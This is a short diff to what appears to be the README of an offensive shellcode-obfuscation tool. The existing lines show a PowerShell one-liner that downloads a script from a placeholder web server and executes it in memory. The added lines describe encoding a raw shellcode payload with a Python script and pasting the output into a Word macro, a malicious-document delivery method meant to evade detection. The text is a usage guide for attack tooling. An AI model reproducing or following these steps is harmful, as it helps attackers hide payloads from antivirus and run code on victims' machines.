@@ -43,5 +43,9 @@ You can do the exact opposite in C# to get your shellcode.
     > Open a Powershell windows on the client side and make an in-memory execution :
         iwr http://yourwebserveripaddress/generated_code.ps1 | IEX
 
+# For VBA :
+    > Generate your RAW shellcode file
+    > Use the encoder to obfuscate it : python.exe .\encode_vba.py .\payload.bin
+    > Open word, create a new macro and paste the generated_macro.vba content in it
 
 <br /><br /><br />
